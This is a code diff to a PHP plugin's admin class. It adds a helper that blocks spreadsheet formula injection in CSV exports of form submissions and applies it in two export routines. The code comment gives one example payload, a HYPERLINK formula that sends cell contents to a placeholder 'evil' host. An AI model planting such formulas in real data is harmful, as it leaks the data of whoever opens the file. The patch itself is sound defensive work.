@@ -1940,6 +1940,37 @@ class Admin {
     /**
      * Export submissions to CSV via AJAX
      */
+    /**
+     * Neutralize CSV/spreadsheet formula injection for a single cell.
+     *
+     * A spreadsheet (Excel, Sheets, LibreOffice) treats a cell whose first
+     * character is one of = + - @ (or a leading TAB / CR that Excel strips
+     * before parsing) as a FORMULA. Attacker-controlled fields (email, phone,
+     * name, address, promo code, etc.) flow into the export, so a value like
+     * `=HYPERLINK("http://evil/?"&A1)` would execute on open. We defuse it by
+     * prefixing a single apostrophe, which forces the cell to be read as literal
+     * text. This runs BEFORE RFC-4180 quote-doubling/wrapping, which is applied
+     * separately by the caller and is unaffected.
+     *
+     * @param mixed $value Raw cell value.
+     * @return string      Value made safe to place in a CSV cell.
+     */
+    private static function sanitize_csv_cell($value): string {
+        $value = (string) ($value ?? '');
+
+        if ($value === '') {
+            return $value;
+        }
+
+        // Leading TAB (\t) and CR (\r) are stripped by Excel before it decides
+        // whether the cell is a formula, so they must be treated as triggers too.
+        if (strpos("=+-@\t\r", $value[0]) !== false) {
+            return "'" . $value;
+        }
+
+        return $value;
+    }
+
     public function ajax_export_submissions_csv(): void {
         if (!Security::verify_ajax_request('fffl_admin_nonce', 'manage_options')) {
             return;
@@ -2019,9 +2050,11 @@ class Admin {
         $csv_output = '';
         foreach ($csv_lines as $line) {
             $escaped = array_map(function($field) {
+                // Defuse spreadsheet formula injection first, then RFC-4180 escape.
+                $field = self::sanitize_csv_cell($field);
                 // Escape double quotes and wrap in quotes if needed
-                $field = str_replace('"', '""', $field ?? '');
-                if (strpos($field, ',') !== false || strpos($field, '"') !== false || strpos($field, "\n") !== false) {
+                $field = str_replace('"', '""', $field);
+                if (strpos($field, ',') !== false || strpos($field, '"') !== false || strpos($field, "\n") !== false || strpos($field, "\r") !== false) {
                     return '"' . $field . '"';
                 }
                 return $field;
@@ -2497,8 +2530,10 @@ class Admin {
         $csv_output = '';
         foreach ($csv_lines as $line) {
             $escaped = array_map(function($field) {
-                $field = str_replace('"', '""', $field ?? '');
-                if (strpos($field, ',') !== false || strpos($field, '"') !== false || strpos($field, "\n") !== false) {
+                // Defuse spreadsheet formula injection first, then RFC-4180 escape.
+                $field = self::sanitize_csv_cell($field);
+                $field = str_replace('"', '""', $field);
+                if (strpos($field, ',') !== false || strpos($field, '"') !== false || strpos($field, "\n") !== false || strpos($field, "\r") !== false) {
                     return '"' . $field . '"';
                 }
                 return $field;
